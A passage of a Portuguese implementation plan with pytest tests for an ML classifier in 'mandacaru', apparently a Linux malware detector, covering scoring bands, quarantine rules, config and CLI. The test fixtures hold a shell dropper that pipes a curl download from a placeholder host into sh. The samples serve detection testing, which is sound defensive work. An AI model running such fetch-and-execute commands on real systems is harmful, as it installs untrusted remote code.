- `load_model`: lê no máximo `MAX_MODEL_BYTES + 1` bytes, confere o SHA-256 se `expected_sha256` não for `None` e
  chama `parse_model`.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_model.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/model.py tests/ml_model.py tests/test_ml_model.py
git commit -m "ML: formato JSON estrito do modelo, avaliacao iterativa, calibracao e contribuicoes"
```

---

### Task 6: Motivos em português

**Files:**
- Create: `src/mandacaru/ml/reasons.py`
- Create: `src/mandacaru/ml/explain.py`
- Test: `tests/test_ml_explain.py`

**Interfaces:**
- Consumes: `Model.contributions` (Task 5); `ELF_FEATURE_NAMES`, `SCRIPT_FEATURE_NAMES` (Tasks 3–4).
- Produces:
  - `REASONS: dict[str, tuple[str, str | None]]` (nome da característica → frase curta sem acento e técnica MITRE ou
    `None`), cobrindo **todos** os nomes das duas famílias. MITRE: `ind_mineracao` → `T1496`; `ind_persistencia` →
    `T1053`; `upx`, `entropia_max_secao`, `blocos_b64`, `escapes_hex`, `decodificacao` → `T1027`; `ind_download`,
    `baixa_e_executa` → `T1105`; `ind_shell_reverso` → `T1059`; `ind_credenciais` → `T1552`; `ind_sabotagem` →
    `T1562`; `ind_resgate` → `T1486`. Exemplos de frase: `upx` → `"compactado com UPX"`; `tem_symtab` →
    `"sem simbolos"` (contribuição positiva com valor 0); `ind_mineracao` → `"endereco de pool de mineracao"`.
  - `@dataclass(frozen=True) class Reason: feature: str; value: float; contribution: float; text: str;
    mitre: str | None`
  - `top_reasons(model: Model, x: Sequence[float], k: int = 5) -> list[Reason]`: só contribuições > 0, em ordem
    decrescente.

- [ ] **Step 1: Write the failing tests**

```python
from mandacaru.ml.explain import top_reasons
from mandacaru.ml.features import ELF_FEATURE_NAMES, SCRIPT_FEATURE_NAMES
from mandacaru.ml.model import parse_model
from mandacaru.ml.reasons import REASONS
from ml_model import model_dict, stump
import json

def test_toda_caracteristica_tem_frase():
    assert set(ELF_FEATURE_NAMES) | set(SCRIPT_FEATURE_NAMES) <= set(REASONS)
    for texto, mitre in REASONS.values():
        assert texto.isascii() and len(texto) <= 60
        assert mitre is None or mitre.startswith("T")

def test_top_reasons_ordenado_e_so_positivos():
    iu, ie = ELF_FEATURE_NAMES.index("upx"), ELF_FEATURE_NAMES.index("ind_mineracao")
    d = model_dict(trees=[stump(iu, 0.5, -1.0, 2.0), stump(ie, 0.5, -0.5, 4.0)])
    m = parse_model(json.dumps(d).encode())
    x = [0.0] * len(ELF_FEATURE_NAMES); x[iu] = 1; x[ie] = 2
    r = top_reasons(m, x, k=5)
    assert [z.feature for z in r] == ["ind_mineracao", "upx"]
    assert r[0].mitre == "T1496" and r[1].text == "compactado com UPX"
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_explain.py -q`
Expected: FAIL

- [ ] **Step 3: Write `REASONS` in `reasons.py` and `top_reasons` in `explain.py`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_explain.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/reasons.py src/mandacaru/ml/explain.py tests/test_ml_explain.py
git commit -m "ML: motivos em portugues e tecnicas MITRE a partir das contribuicoes"
```

---

### Task 7: Índice de arquivos conhecidos do dpkg

**Files:**
- Create: `src/mandacaru/ml/knowngood.py`
- Test: `tests/test_ml_knowngood.py`

**Interfaces:**
- Produces: `class DpkgKnownGood: __init__(self, info_dir: Path = Path("/var/lib/dpkg/info"))`,
  `contains(self, data: bytes) -> bool` (MD5 do conteúdo no índice). O índice é carregado na primeira chamada e
  recarregado quando o `st_mtime_ns` de `info_dir` muda. Uma pasta ausente ou ilegível vale como índice vazio. Os
  digests ficam guardados como `bytes` de 16 posições.

- [ ] **Step 1: Write the failing tests**

```python
import hashlib, os, time
from mandacaru.ml.knowngood import DpkgKnownGood

def test_reconhece_arquivo_de_pacote(tmp_path):
    conteudo = b"\x7fELF binario legitimo"
    (tmp_path / "coreutils.md5sums").write_text(f"{hashlib.md5(conteudo).hexdigest()}  usr/bin/ls\n")
    kg = DpkgKnownGood(tmp_path)
    assert kg.contains(conteudo) and not kg.contains(b"outro")

def test_recarrega_quando_o_dpkg_muda(tmp_path):
    kg = DpkgKnownGood(tmp_path)
    assert not kg.contains(b"novo")
    (tmp_path / "x.md5sums").write_text(f"{hashlib.md5(b'novo').hexdigest()}  usr/bin/x\n")
    os.utime(tmp_path, ns=(time.time_ns(), time.time_ns() + 10**9))
    assert kg.contains(b"novo")

def test_pasta_ausente_e_linhas_ruins(tmp_path):
    assert DpkgKnownGood(tmp_path / "nao-existe").contains(b"x") is False
    (tmp_path / "ruim.md5sums").write_text("lixo\nzz  a\n")
    assert DpkgKnownGood(tmp_path).contains(b"x") is False
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_knowngood.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `DpkgKnownGood` in `src/mandacaru/ml/knowngood.py`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_knowngood.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/knowngood.py tests/test_ml_knowngood.py
git commit -m "ML: indice local dos md5 do dpkg para nao isolar arquivo de pacote instalado"
```

---

### Task 8: Decisão, `Classifier` e carga dos modelos instalados

**Files:**
- Create: `src/mandacaru/ml/decision.py`
- Modify: `src/mandacaru/ml/__init__.py`
- Modify: `tests/ml_model.py` (`DROPPER`, `script_classifier`)
- Create: `src/mandacaru/ml/models/README.md` (uma linha: "Modelos gerados pelo Plano 2; o hash de cada um fica
  fixado em `mandacaru/ml/__init__.py`.")
- Test: `tests/test_ml_classifier.py`

**Interfaces:**
- Consumes: Tasks 1, 4, 5, 6, 7.
- Produces (`decision.py`):
  - `MODES = ("off", "shadow", "alert", "isolate")`; `BANDS = ("alto", "reforco", "medio", "baixo")`
  - `decide(policy: KindPolicy, score: float, *, in_tmp: bool, rule_hit_medium: bool, mode: str,
    known_good: bool) -> tuple[str, bool]` → `(faixa, isolar)`
- Produces (`ml/__init__.py`):
  - `@dataclass(frozen=True) class Verdict: kind: str; score: float; band: str; isolate: bool; known_good: bool;
    gate_passed: bool; reasons: tuple[Reason, ...]; model_id: str; sha256: str`
  - `class Classifier: __init__(self, models: dict[str, Model], mode: str, known_good: DpkgKnownGood | None = None,
    budget_s: float = 0.25)`; `mode: str`; `models: dict[str, Model]` (chaves `"elf"`/`"script"`);
    `score(self, data: bytes, *, path: str | None = None, rule_alerts: Sequence[Alert] = ()) -> Verdict | None`
  - `MODEL_SHA256: dict[str, str] = {}` (família → hash fixado; preenchido pelo Plano 2)
  - `@dataclass(frozen=True) class LoadResult: classifier: Classifier | None; problem: str | None; invalid: bool`
  - `load_default(mode: str, *, models_dir: Path | None = None, pinned: dict[str, str] | None = None,
    known_good: DpkgKnownGood | None = None) -> LoadResult` (padrões: a pasta `models/` do pacote, `MODEL_SHA256` e
    `DpkgKnownGood()`)

Regras de `decide` (spec 7.4):

```text
limite_alto = policy.alto_tmp if in_tmp else policy.alto
score >= limite_alto                              -> "alto"
rule_hit_medium and score >= policy.reforco       -> "reforco"
score >= policy.medio                             -> "medio"
senao                                             -> "baixo"
isolar = faixa in ("alto","reforco") and mode == "isolate" and policy.gate_passed and not known_good
```

Regras de `Classifier.score`:
- `mode == "off"` → `None`.
- `detect_kind` → `None` → `None`.
- Modelo da família ausente, ou tipo fora de `model.kinds` → `None`.
- Cache LRU (4.096) por SHA-256 guarda `(score, reasons)`. A faixa é **sempre** recalculada (depende do caminho e das
  regras).
- `ExtractionBudgetExceeded` → aviso em stderr e `None`.
- `in_tmp` = `path == "/tmp"` ou `path` começa com `"/tmp/"`.
- `rule_hit_medium` = algum alerta que não é `ml.*` tem severidade `>= MEDIUM`.
- O `DpkgKnownGood` só é consultado quando a faixa é `alto` ou `reforco`.

Regras de `load_default`:
- Nenhum arquivo `{elf,script}.json` → `LoadResult(None, "nenhum modelo instalado", False)`.
- Arquivo presente sem hash fixado (`f"{nome}: hash nao fixado"`), hash divergente, `ModelError` ou `OSError` →
  `LoadResult(None, motivo, True)`.
- Pelo menos um modelo válido → `LoadResult(Classifier(...), None, False)`.

- [ ] **Step 1: Write the failing tests**

```python
import hashlib, json
import pytest
from mandacaru.events import Alert, Severity
from mandacaru.ml import Classifier, load_default
from mandacaru.ml.decision import decide
from mandacaru.ml.features import SCRIPT_FEATURE_NAMES
from mandacaru.ml.model import KindPolicy, parse_model
from ml_model import model_dict, stump

POL = KindPolicy(gate_passed=True, alto=0.9, alto_tmp=0.97, reforco=0.7, medio=0.5)

@pytest.mark.parametrize("score,tmp,regra,modo,faixa,isola", [
    (0.95, False, False, "isolate", "alto", True),
    (0.95, True, False, "isolate", "medio", False),     # /tmp exige 0.97
    (0.98, True, False, "isolate", "alto", True),
    (0.75, False, True, "isolate", "reforco", True),
    (0.75, False, False, "isolate", "medio", False),
    (0.95, False, False, "alert", "alto", False),       # modo alert nunca isola
    (0.30, False, True, "isolate", "baixo", False),
])
def test_decide(score, tmp, regra, modo, faixa, isola):
    assert decide(POL, score, in_tmp=tmp, rule_hit_medium=regra, mode=modo, known_good=False) == (faixa, isola)

def test_portao_reprovado_e_conhecido_nao_isolam():
    reprovado = KindPolicy(False, 0.9, 0.97, 0.7, 0.5)
    assert decide(reprovado, 0.99, in_tmp=False, rule_hit_medium=False, mode="isolate", known_good=False) == ("alto", False)
    assert decide(POL, 0.99, in_tmp=False, rule_hit_medium=False, mode="isolate", known_good=True) == ("alto", False)

from ml_model import DROPPER, script_classifier as _script_classifier
# em tests/ml_model.py:
#   DROPPER = b"#!/bin/sh\ncurl -s http://exemplo.invalid/x | sh\n"
#   script_classifier(mode, valor): modelo "script" so com o tipo "sh"
#   (gate_passed=True, alto=0.9, alto_tmp=0.97, reforco=0.7, medio=0.5) e uma arvore
#   stump(indice de "baixa_e_executa", 0.5, -5.0, valor); valor=2.6 da nota ~0.93

def test_score_e_faixa_por_caminho_com_cache():
    c = _script_classifier()
    v1 = c.score(DROPPER, path="/home/ana/Downloads/x.sh")
    v2 = c.score(DROPPER, path="/tmp/x.sh")
    assert v1.band == "alto" and v1.isolate and v1.kind == "sh"
    assert v2.band == "medio" and not v2.isolate and v2.score == v1.score   # mesmo conteudo, outra faixa
    assert v1.sha256 == hashlib.sha256(DROPPER).hexdigest()

def test_reforco_vem_das_regras_e_nao_de_ml():
    c = _script_classifier()
    data = b"#!/bin/sh\ncurl -s http://exemplo.invalid/x | sh\n"
    regra = Alert("yara.Shell_Pipe_To_Interpreter", Severity.MEDIUM, "x", {"path": "/tmp/x"})
    ml = Alert("ml.suspeito", Severity.MEDIUM, "x", {"path": "/tmp/x"})
    assert c.score(data, path="/tmp/x", rule_alerts=[ml]).band == "medio"
    assert c.score(data, path="/tmp/x", rule_alerts=[regra]).band == "reforco"   # 0.93: abaixo de alto_tmp


def test_modos_off_e_tipo_desconhecido():
    assert _script_classifier("off").score(DROPPER) is None
    assert _script_classifier().score(b"%PDF-1.7") is None
    assert _script_classifier().score(b"\x7fELF\x02\x01\x01" + b"\0" * 9 + b"\x02\x00>\x00" + b"\0" * 44) is None

def test_load_default(tmp_path):
    assert load_default("isolate", models_dir=tmp_path, pinned={}).problem == "nenhum modelo instalado"
    (tmp_path / "script.json").write_text(json.dumps(model_dict(family="script")))
    r = load_default("isolate", models_dir=tmp_path, pinned={})
    assert r.classifier is None and r.invalid and "hash" in r.problem
    h = hashlib.sha256((tmp_path / "script.json").read_bytes()).hexdigest()
    assert load_default("isolate", models_dir=tmp_path, pinned={"script": h}).classifier is not None
    (tmp_path / "script.json").write_bytes(b'{"format_version": 1, "trunc')
    r = load_default("isolate", models_dir=tmp_path, pinned={"script": h})
    assert r.classifier is None and r.invalid
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_classifier.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `decide`, `Verdict`, `Classifier`, `LoadResult` and `load_default`**

O cache LRU usa `collections.OrderedDict` dentro do `Classifier`. A pasta padrão é
`importlib.resources.files("mandacaru") / "ml" / "models"`.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_classifier.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/decision.py src/mandacaru/ml/__init__.py src/mandacaru/ml/models/README.md tests/ml_model.py tests/test_ml_classifier.py
git commit -m "ML: faixas, reforco, limiar do /tmp, Classifier com cache e carga dos modelos com hash fixado"
```

---

### Task 9: Alertas `ml.*` no `StaticScanner`

**Files:**
- Create: `src/mandacaru/ml/alerts.py`
- Modify: `src/mandacaru/detectors/static.py:109-135` (`StaticScanner.__init__` e `scan_bytes`)
- Test: `tests/test_ml_scanner.py`

**Interfaces:**
- Consumes: `Classifier`, `Verdict` (Task 8).
- Produces:
  - `verdict_alert(v: Verdict, path: Path) -> Alert | None` → `None` se `v.band == "baixo"` ou `v.known_good`.
    Regras: `alto` → `ml.malware`; `reforco` → `ml.malware_reforco` (ambos `HIGH`); `medio` → `ml.suspeito`
    (`MEDIUM`).
  - `shadow_record(v: Verdict, path: Path) -> dict` com `ts`, `path`, `sha256`, `kind`, `score`, `band`,
    `would_isolate` (`band in (alto, reforco) and gate_passed and not known_good`), `model_id` e `motivos`.
  - `StaticScanner.__init__(self, extra_rule_dirs=(), exclude=(), classifier: Classifier | None = None,
    shadow_sink: Callable[[dict], None] | None = None)`
- `summary` (≤ 200 caracteres, cortado no limite):
  - `alto`/`reforco`: `f"IA: {path.name} parece malware (confianca {pct}%) - {m1}; {m2}; {m3}. Use Analisar antes de
    Confio"`
  - `medio`: `f"IA: {path.name} suspeito (confianca {pct}%) - {m1}; {m2}; {m3}"`
- `evidence`: `path`, `sha256`, `score` (4 casas), `ml_band`, `ml_isolate`, `kind`, `model_id`,
  `feature_version`, `motivos` (até 5, cada um `{"feature", "valor", "contribuicao"}`).
- `mitre`: técnicas distintas dos motivos, na ordem.

- [ ] **Step 1: Write the failing tests**

```python
import json
from pathlib import Path
from mandacaru.detectors.static import StaticScanner
from ml_model import DROPPER, script_classifier

# tmp_path fica dentro de /tmp: valor=4.0 (nota ~0.98) passa do alto_tmp de 0.97
def _script_classifier(mode="isolate"):
    return script_classifier(mode, valor=4.0)

def test_scanner_anexa_alerta_ml(tmp_path):
    s = StaticScanner(classifier=_script_classifier())
    f = tmp_path / "x.sh"; f.write_bytes(DROPPER)
    ml = [a for a in s.scan_file(f) if a.rule.startswith("ml.")]
    assert len(ml) == 1 and ml[0].rule == "ml.malware" and ml[0].severity.name == "HIGH"
    ev = ml[0].evidence
    assert ev["ml_isolate"] is True and ev["kind"] == "sh" and len(ev["motivos"]) <= 5
    assert len(ml[0].summary) <= 200 and ml[0].summary.startswith("IA: x.sh parece malware")
    assert "exemplo.invalid" not in ml[0].summary                      # nada do conteudo
    assert "T1105" in ml[0].mitre

def test_regras_continuam_iguais(tmp_path):
    f = tmp_path / "x.sh"; f.write_bytes(DROPPER)
    sem = {a.rule for a in StaticScanner().scan_file(f)}
    com = {a.rule for a in StaticScanner(classifier=_script_classifier()).scan_file(f)}
    assert sem and sem <= com and not any(r.startswith("ml.") for r in sem)

def test_modo_sombra_nao_alerta_e_grava(tmp_path):
    got = []
    s = StaticScanner(classifier=_script_classifier("shadow"), shadow_sink=got.append)
    f = tmp_path / "x.sh"; f.write_bytes(DROPPER)
    assert not [a for a in s.scan_file(f) if a.rule.startswith("ml.")]
    assert got[0]["would_isolate"] is True and got[0]["band"] == "alto"    # o que faria no modo isolate
    json.dumps(got[0])

def test_arquivo_do_tamanho_limite_nao_e_avaliado():
    from mandacaru.detectors.static import MAX_BYTES
    s = StaticScanner(classifier=_script_classifier())
    assert not [a for a in s.scan_bytes(Path("/x/y.sh"), DROPPER + b"#" * MAX_BYTES) if a.rule.startswith("ml.")]
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_scanner.py -q`
Expected: FAIL

- [ ] **Step 3: Implement `verdict_alert` and `shadow_record`, and call the classifier at the end of `scan_bytes`**

Em `scan_bytes`: depois das regras e heurísticas, se houver `classifier` e `len(data) < MAX_BYTES`, chame
`classifier.score(data, path=str(path), rule_alerts=alerts)`. Com modo `shadow`: chame `shadow_sink(shadow_record(...))`
quando a faixa não for `baixo` e houver `shadow_sink`, sem anexar alerta. Nos outros modos: anexe
`verdict_alert(...)` quando não for `None`. Uma exceção do classificador vira aviso em stderr e nunca impede as
regras.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_ml_scanner.py tests/test_detectors.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/ml/alerts.py src/mandacaru/detectors/static.py tests/test_ml_scanner.py
git commit -m "ML: alertas ml.* no scanner estatico, com motivos e registro do modo sombra"
```

---

### Task 10: Motor só isola `ml.*` autorizado e respeita a lista de confiança

**Files:**
- Modify: `src/mandacaru/engine.py:91-123` (`Engine._quarantine`)
- Test: `tests/test_engine_quarantine.py` (acrescentar)

**Interfaces:**
- Consumes: `evidence["ml_isolate"]` e `evidence["sha256"]` (Task 9); `Quarantine.trust.contains(sha256)`
  (existente).
- Produces: invariante, ou seja, um alerta cujo `rule` começa com `"ml."` só é candidato a isolamento se
  `a.evidence.get("ml_isolate") is True`. Um alerta `ml.*` não isolado, cujo `sha256` esteja na lista de confiança,
  vira `Severity.INFO` com `evidence["trusted"] = True`.

- [ ] **Step 1: Write the failing tests** (reaproveitando as fixtures `q`, `w` e `trust` do arquivo)

```python
from mandacaru.events import Alert, Severity

def _ml(path, isolar, sev=Severity.HIGH):
    return Alert("ml.malware", sev, "IA: x", {"path": str(path), "ml_isolate": isolar, "sha256": "ab" * 32})

def test_ml_sem_autorizacao_nao_isola_nem_com_min_medium(q, w):
    f = w / "a.bin"; f.write_bytes(b"\x7fELF qualquer")
    e = Engine([lambda a: None], quarantine=q, watch_paths=[str(w)], quarantine_min_severity=Severity.MEDIUM)
    found = [_ml(f, False), Alert("ml.suspeito", Severity.MEDIUM, "x", {"path": str(f), "ml_isolate": False})]
    e._quarantine(found)
    assert q.list() == [] and f.exists()

def test_ml_autorizado_isola(q, w):
    f = w / "a.bin"; f.write_bytes(b"\x7fELF qualquer")
    a = _ml(f, True)
    Engine([lambda a: None], quarantine=q, watch_paths=[str(w)])._quarantine([a])
    assert a.quarantine_id and not f.exists()

def test_regra_isola_mesmo_com_ml_nao_autorizado_antes(q, w):
    f = w / "a.py"; f.write_text(HIGH)
    regra = Alert("yara.Py_Exec_Decoded_Payload", Severity.HIGH, "x", {"path": str(f)})
    Engine([lambda a: None], quarantine=q, watch_paths=[str(w)])._quarantine([_ml(f, False), regra])
    assert regra.quarantine_id

def test_ml_no_modo_alerta_respeita_lista_de_confianca(q, w, trust):
    f = w / "a.bin"; f.write_bytes(b"\x7fELF qualquer")
    trust.add("ab" * 32, str(f), "teste")
    a = _ml(f, False)
    Engine([lambda a: None], quarantine=q, watch_paths=[str(w)])._quarantine([a])
    assert a.severity == Severity.INFO and a.evidence["trusted"] is True
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_engine_quarantine.py -q`
Expected: FAIL nos testes novos

- [ ] **Step 3: Implement the candidate filter and the trust downgrade in `Engine._quarantine`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_engine_quarantine.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/engine.py tests/test_engine_quarantine.py
git commit -m "Motor: alerta ml.* so isola com ml_isolate; fora do isolamento respeita a lista de confianca"
```

---

### Task 11: Configuração `[ml]`, ligação no monitor e no `scan`, log do modo sombra

**Files:**
- Modify: `src/mandacaru/config.py` (campos `ml_enabled: bool = True`, `ml_mode: str = "shadow"`; seção `"ml"` no
  `_SCHEMA` com `"enabled": ("ml_enabled", _bool)` e `"mode": ("ml_mode", _enum(_ML_MODES))`;
  `_ML_MODES = ("off", "shadow", "alert", "isolate")`)
- Modify: `src/mandacaru/cli.py` (`cmd_monitor`, `cmd_scan`, nova `build_classifier`)
- Modify: `packaging/config.toml` (no fim, a seção abaixo)
- Modify: `debian/mandacaru.logrotate` (entrada nova)
- Test: `tests/test_ml_wiring.py`, `tests/test_packaging.py` (acrescentar)

**Interfaces:**
- Consumes: `load_default`, `LoadResult` (Task 8); `StaticScanner(classifier=..., shadow_sink=...)` (Task 9).
- Produces:
  - `SHADOW_LOG = "/var/log/mandacaru/ml-shadow.jsonl"` (em `ml/__init__.py`)
  - `effective_ml_mode(cfg: Config, *, for_scan: bool = False) -> str`: `"off"` se `not cfg.ml_enabled`; no `scan`,
    `shadow` vira `off` e `isolate` vira `alert`.
  - `build_classifier(cfg: Config, *, for_scan: bool) -> tuple[Classifier | None, Alert | None]` em `cli.py`: no
    monitor, `LoadResult.invalid` gera `Alert("ml.modelo_invalido", Severity.HIGH, f"Classificador de IA desligado:
    {problem}", {"problema": problem})`, que o `cmd_monitor` envia aos sinks ao iniciar; `problem` sem `invalid`
    vira aviso em stderr só no monitor.
  - `shadow_writer(path: str) -> Callable[[dict], None] | None`: abre com `os.open(..., O_WRONLY|O_APPEND|O_CREAT,
    0o640)`, escreve uma linha JSON por registro sob um `threading.Lock`; sem permissão → aviso e `None`.

Seção nova no fim de `packaging/config.toml`:

```toml
[ml]
enabled = true
# mode = "shadow"   # off | shadow | alert | isolate (o padrao vem do programa)
```

Entrada nova em `debian/mandacaru.logrotate`:

```text
/var/log/mandacaru/ml-shadow.jsonl {
    weekly
    rotate 8
    compress
    missingok
    notifempty
    create 0640 root root
}
```

- [ ] **Step 1: Write the failing tests**

```python
import pytest
from mandacaru.cli import build_classifier, effective_ml_mode
from mandacaru.config import Config, ConfigError, load_config

def test_config_ml(tmp_path):
    p = tmp_path / "c.toml"; p.write_text('[ml]\nmode = "isolate"\n')
    assert load_config(p).ml_mode == "isolate"
    assert Config().ml_mode == "shadow" and Config().ml_enabled is True
    p.write_text('[ml]\nmode = "tudo"\n')
    with pytest.raises(ConfigError):
        load_config(p)

@pytest.mark.parametrize("cfg,scan,esperado", [
    (Config(ml_mode="isolate"), False, "isolate"),
    (Config(ml_mode="isolate"), True, "alert"),
    (Config(ml_mode="shadow"), True, "off"),
    (Config(ml_enabled=False, ml_mode="isolate"), False, "off"),
])
def test_modo_efetivo(cfg, scan, esperado):
    assert effective_ml_mode(cfg, for_scan=scan) == esperado

def test_sem_modelo_instalado_fica_desligado_sem_alerta():
    clf, alerta = build_classifier(Config(ml_mode="isolate"), for_scan=False)
    assert clf is None and alerta is None          # Plano 1 nao instala modelo
```

E em `tests/test_packaging.py`:

```python
def test_config_traz_ml_com_modo_comentado():
    txt = (ROOT / "packaging" / "config.toml").read_text()
    assert "[ml]" in txt and '# mode = "shadow"' in txt
    assert load_config(ROOT / "packaging" / "config.toml").ml_mode == "shadow"

def test_logrotate_do_modo_sombra():
    assert "/var/log/mandacaru/ml-shadow.jsonl" in (ROOT / "debian" / "mandacaru.logrotate").read_text()
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_ml_wiring.py tests/test_packaging.py -q`
Expected: FAIL

- [ ] **Step 3: Implement the config, `effective_ml_mode`, `build_classifier`, `shadow_writer`, the wiring and the packaging edits**

- `cmd_monitor`: monta `StaticScanner(cfg.rule_dirs, cfg.exclude, classifier=clf, shadow_sink=shadow_writer(
  SHADOW_LOG) if clf and clf.mode == "shadow" else None)`; envia o alerta `ml.modelo_invalido` aos sinks; imprime
  `[mandacaru] classificador de IA: modo <modo>, modelos: <ids>`.
- `cmd_scan`: usa `build_classifier(cfg, for_scan=True)`.
- `quarantine_cli.py` (análise de caso) continua sem classificador.

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest -q && .venv/bin/ruff check .`
Expected: suíte inteira passa

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/config.py src/mandacaru/cli.py src/mandacaru/ml/__init__.py packaging/config.toml debian/mandacaru.logrotate tests/test_ml_wiring.py tests/test_packaging.py
git commit -m "ML: secao [ml], modos, ligacao no monitor e no scan, log do modo sombra"
```

---

### Task 12: Telemetria leva a nota do modelo

**Files:**
- Modify: `src/mandacaru/telemetry/sanitizer.py` (`sanitize_event_payload` ganha `ml: dict | None = None`)
- Modify: `src/mandacaru/telemetry/producer.py` (`payload_from_case`)
- Test: `tests/test_telemetry.py` (acrescentar)

**Interfaces:**
- Consumes: `evidence["score"]`, `evidence["model_id"]` dos alertas `ml.*` (Task 9).
- Produces: `payload["detection"]["ml"] = {"model_id": str, "score": float}` só quando algum alerta do caso é
  `ml.*`; a chave não existe nos outros casos.

- [ ] **Step 1: Write the failing test**

```python
def test_payload_leva_nota_do_modelo_sem_conteudo():
    from types import SimpleNamespace
    from mandacaru.events import Alert, Severity
    from mandacaru.telemetry.producer import payload_from_case
    case = SimpleNamespace(sha256="a" * 64, size=10, quarantined_at=0.0)
    ml = Alert("ml.malware", Severity.HIGH, "IA: x", {"path": "/home/ana/x", "score": 0.9731, "model_id": "elf-1",
                                                       "motivos": [{"feature": "upx"}]})
    p = payload_from_case(case, [ml], tlp="TLP:CLEAR")
    assert p["detection"]["ml"] == {"model_id": "elf-1", "score": 0.9731}
    assert "/home/ana" not in json.dumps(p)
    assert "ml" not in payload_from_case(case, [], tlp="TLP:CLEAR")["detection"]
```

- [ ] **Step 2: Run to verify it fails**

Run: `.venv/bin/python -m pytest tests/test_telemetry.py -q`
Expected: FAIL no teste novo

- [ ] **Step 3: Implement the `ml` parameter and fill it in `payload_from_case`**

- [ ] **Step 4: Run to verify it passes**

Run: `.venv/bin/python -m pytest tests/test_telemetry.py tests/test_engine_quarantine.py -q && .venv/bin/ruff check src tests`
Expected: todos passam

- [ ] **Step 5: Commit**

```bash
git add src/mandacaru/telemetry/sanitizer.py src/mandacaru/telemetry/producer.py tests/test_telemetry.py
git commit -m "Telemetria: payload leva model_id e nota quando o caso veio do classificador"
```

---

### Task 13: Comandos `mandacaru ml status | avaliar | sombra`

**Files:**
- Create: `src/mandacaru/ml/cli.py`
- Modify: `src/mandacaru/cli.py` (`build_parser`: `add_ml_parser(sub)`)
- Test: `tests/test_ml_cli.py`

**Interfaces:**
- Consumes: `load_default`, `Classifier`, `Verdict`, `SHADOW_LOG`, `MAX_BYTES`.
- Produces: `add_parser(sub) -> None`; `cmd_ml(args) -> int`. Subcomandos:
  - `status`: modo efetivo e, por família, `model_id`, tipos e se passaram no portão. Sem modelo:
    `"nenhum modelo instalado"` e saída `0`. Modelo inválido: o motivo e saída `4`.
  - `avaliar ARQUIVO... [--json]`: modo efetivo `alert`, sem consultar o dpkg para decidir. Uma linha por arquivo:
    `f"{caminho}: {faixa} {pct}% ({tipo}, {model_id}) - {motivos}"`; `"nao avaliado (tipo nao suportado)"`;
    `"nao avaliado (maior que 8 MB)"`; sufixo `" [identico a arquivo de pacote instalado]"` quando o dpkg reconhece.
    Saída `2` se algum der `alto` ou `reforco`; senão `0`. Sem modelo: mensagem e saída `1`.
  - `sombra [--desde AAAA-MM-DD] [--arquivo CAMINHO]`: contagem por faixa e as 20 entradas com
    `would_isolate == true` de maior nota (caminho, nota, motivos). Arquivo ausente: `"sem registros do modo sombra"`
    e saída `0`.
  - Para testar sem depender do pacote, as funções aceitam `models_dir`/`pinned` via `args` (atributos opcionais
    `_models_dir` e `_pinned`, só em teste).

- [ ] **Step 1: Write the failing tests**

```python
import argparse, hashlib, json
from mandacaru.ml.cli import cmd_ml
from ml_model import model_dict, stump
from mandacaru.ml.features import SCRIPT_FEATURE_NAMES

def _modelos(tmp_path):
    i = SCRIPT_FEATURE_NAMES.index("baixa_e_executa")
    kinds = {"sh": {"gate_passed": True, "alto": 0.9, "alto_tmp": 0.97, "reforco": 0.7, "medio": 0.5}}
    p = tmp_path / "script.json"
    # tmp_path fica dentro de /tmp: 4.0 (nota ~0.98) passa do alto_tmp de 0.97
    p.write_text(json.dumps(model_dict(family="script", kinds=kinds, trees=[stump(i, 0.5, -5.0, 4.0)])))
    return {"script": hashlib.sha256(p.read_bytes()).hexdigest()}

def ns(tmp_path, **kw):
    base = dict(config=None, mcmd="status", arquivos=[], as_json=False, desde=None, arquivo=None,
                _models_dir=tmp_path, _pinned={})
    base.update(kw)
    return argparse.Namespace(**base)

def test_status_sem_modelo(tmp_path, capsys):
    assert cmd_ml(ns(tmp_path)) == 0 and "nenhum modelo instalado" in capsys.readouterr().out

def test_avaliar(tmp_path, capsys):
    pinned = _modelos(tmp_path)
    mal = tmp_path / "x.sh"; mal.write_bytes(b"#!/bin/sh\ncurl -s http://e.invalid/a | sh\n")
    pdf = tmp_path / "d.pdf"; pdf.write_bytes(b"%PDF-1.7")
    rc = cmd_ml(ns(tmp_path, mcmd="avaliar", arquivos=[str(mal), str(pdf)], _pinned=pinned))
    out = capsys.readouterr().out
    assert rc == 2 and "alto" in out and "nao avaliado (tipo nao suportado)" in out

def test_sombra(tmp_path, capsys):
    log = tmp_path / "s.jsonl"
    log.write_text("\n".join(json.dumps({"ts": "2026-12-01T10:00:00+00:00", "path": f"/tmp/{i}", "band": b,
                    "score": s, "would_isolate": w, "motivos": []})
